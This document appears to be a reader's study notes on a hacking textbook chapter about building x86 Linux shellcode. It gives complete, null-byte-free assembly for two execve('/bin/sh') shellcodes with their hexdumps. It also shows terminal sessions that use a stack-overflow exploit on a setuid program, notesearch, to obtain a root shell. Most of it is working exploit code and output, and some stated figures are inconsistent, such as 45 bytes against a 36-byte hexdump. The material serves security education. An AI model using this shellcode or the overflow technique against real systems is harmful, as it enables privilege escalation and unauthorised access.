Now that we've learned how to make system calls and avoid null bytes, all sorts of shellcodes can be constructed
To spawn a shell, we just need to make a system call to execute the /bin/sh shell program
System call number 11, execve(), is similar to the C execute() (said in book, but I think it should be system or execle) function that we used in the previous chapters

__________________________________________________________________________________
EXECVE(2)                   Linux Programmer's Manual                    EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);

DESCRIPTION
       execve() executes the program pointed to by filename. Filename must be
       either a binary executable, or a script starting with a line of the
       form "#! interpreter [arg]". In the latter case, the interpreter must
       be a valid pathname for an executable which is not itself a script,
       which will be invoked as interpreter [arg] filename.

       argv is an array of argument strings passed to the new program. envp
       is an array of strings, conventionally of the form key=value, which are
       passed as environment to the new program. Both argv and envp must be
       terminated by a null pointer. The argument vector and environment can
       be accessed by the called program's main function, when it is defined
       as int main(int argc, char *argv[], char *envp[]).
__________________________________________________________________________________

The first argument of the filename should be a pointer to the string "/bin/sh", since this is what we want to execute
The environment array-- the third argument can be empty, but it still needs to be terminated with a 32-bit null pointer
The argument array-- the second argument-- must be null-terminated, too; it must also contain the string pointer (since the zeroeth argument is the name of the running program)
Done in C, a program making this call would look like:

exec_shell.c
__________________________________________________________________________________
#include <unistd.h>

int main() {
   char filename[] = "/bin/sh\x00";
   char **argv, **envp; // Arrays that contain char pointers

   argv[0] = filename; // The only argument is filename
   argv[1] = 0; // Null terminate the argument array

   envp[0] = 0; // Null terminate the environment array

   execve(filename, argv, envp);
}
__________________________________________________________________________________

To do this in assembly, the argument and environment arrays need to be built in  memory
In addition, the "/bin/sh" string needs to be terminated with a null byte
This must be built in memroy as well
Dealing with memory in assembly is similar to using pointers in C
The lea instruction, whose name stands for load effective address, works like the address-of operator in C

__________________________________________________________________________
 Instruction            Description
__________________________________________________________________________
lea <dest>, <source>    Load the effective address of the source operand
                        into the destination operand
__________________________________________________________________________

With Intel assembyl syntax, operands can be dereferenced as pointers if they are surrounded by square brackets
For example, the following instruction in assembly will treat EBX+12 as a pointer and write eax to where it's pointing

___________________________________________________________________________
89 43 0C                mov [ebx+12], eax
___________________________________________________________________________

The following shellcode uses the new instructions to build execve() arguments in memory
The environment array is collapsed into the end of the argument array, so they share the same 32-bit null terminator

exec_shell.s
__________________________________________________________________________________
BITS 32

  jmp short two     ; Jump down to the bottom for the call trick
one:
; int execve(const char *filename, char *const argv [], char *const envp[])
  pop ebx           ; Ebx has the addr of the string
  xor eax, eax      ; Put 0 into eax
  mov [ebx+7], al   ; Null terminate the /bin/sh string
  mov [ebx+8], ebx  ; Put addr from ebx where the AAAA is
  mov [ebx+12], eax ; Put 32-bit null terminator where the BBBB is
  lea ecx, [ebx+8]  ; Load the address of [ebx+8] into ecx for argv ptr
  lea edx, [ebx+12] ; Edx = ebx + 12, which is the envp ptr
  mov al, 11        ; Syscall #11
  int 0x80          ; Do it

two:
  call one          ; Use a call to get string address
  db '/bin/shXAAAABBBB'     ; The XAAAABBBB bytes aren't needed
__________________________________________________________________________________

After terminating the string and building the arrays, the shellcode uses the lea instruction (above) to put a pointer to the argument array into the ECX register
Loading the effective address of a bracketed register added to a value is an efficient way to add the value to the register and store the result in another register
In the example above, the brackets dereference EBX+8 as the argument to lea, which loads that address into ECX
Loading the address of a dereferenced pointer produces the original pointer, so this instruction puts EBX+8 into ECX
Normally, this would require both a mov and an add instruction
When assembled, this shellcode is devoid of null bytes
It will spawn a shell when used in an exploit
__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm exec_shell.s

reader@hacking:~/booksrc $ wc -c exec_shell
36 exec_shell

reader@hacking:~/booksrc $ hexdump -C exec_shell
00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b |..[1..C..[..C..K|
00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69 |..S........../bi|
00000020  6e 2f 73 68                                      |n/sh|
00000024

reader@hacking:~/booksrc $ export SHELLCODE=$(cat exec_shell)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9c0

reader@hacking:~/booksrc $ ./notesearch $(perl -e
 'print "\xc0\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
sh-3.2# whoami
root
sh-3.2#
__________________________________________________________________________________

This shellcode, however, can be shortened to less than the current 45 bytes
Since shellcode needs to be injected into program memory somewher, smaller shellcode can be used in tighter exploit situations with smaller usable buffers
The smaller the shellcode, the more situations it can be used in
Obviously, the XAAAABBBB visual aid can be trimmed from the end of the string, which brings the shellcode down to 36 bytes
__________________________________________________________________________________
reader@hacking:~/booksrc/shellcodes $ hexdump -C exec_shell
00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b |..[1..C..[..C..K|
00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69 |..S........../bi|
00000020  6e 2f 73 68                                      |n/sh|
00000024

reader@hacking:~/booksrc/shellcodes $ wc -c exec_shell
36 exec_shell
__________________________________________________________________________________

The shellcode can be shrunk down further by redesigning it and using registers more efficiently
The ESP register is the stack pointer, pointing to the top of the stack
When a value is pushed to the stack, ESP is moved up in memory (by subtracting 4) and the value is placed at the top of the stack
When a value is popped from the stack, the pointer in ESP is moved down in memory (by adding 4)

The following shellcode uses push instructions to build the necessary memory structures for the execve() system call

tiny_shell.s
__________________________________________________________________________________
BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; Zero out eax
  push eax          ; Push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx, via esp
  push eax          ; Push 32-bit null terminator to stack
  mov edx, esp      ; This is an empty array for envp
  push ebx          ; Push string addr to stack above null terminator
  mov ecx, esp      ; This is the argv array with string ptr
  mov al, 11        ; Syscall #11
  int 0x80          ; Do it
__________________________________________________________________________________

This shellcode builds the null-terminated string "/bin//sh" on the stack, and then copies ESP for the pointer
The extra backslash doesn't matter and is effectively ignored
The same method is used to build the arrays for the remaining arguments
The resultig shellcode still spawns a shell but is only 25 bytes, compared to 36 bytes using the jmp call method

__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm tiny_shell.s

reader@hacking:~/booksrc $ wc -c tiny_shell
25 tiny_shell

reader@hacking:~/booksrc $ hexdump -C tiny_shell
00000000 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 |1.Ph//shh/bin..P|
00000010 89 e2 53 89 e1 b0 0b cd 80                      |..S......|
00000019

reader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)

reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9cb

reader@hacking:~/booksrc $ ./notesearch $(perl -e
 'print "\xcb\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
sh-3.2#
__________________________________________________________________________________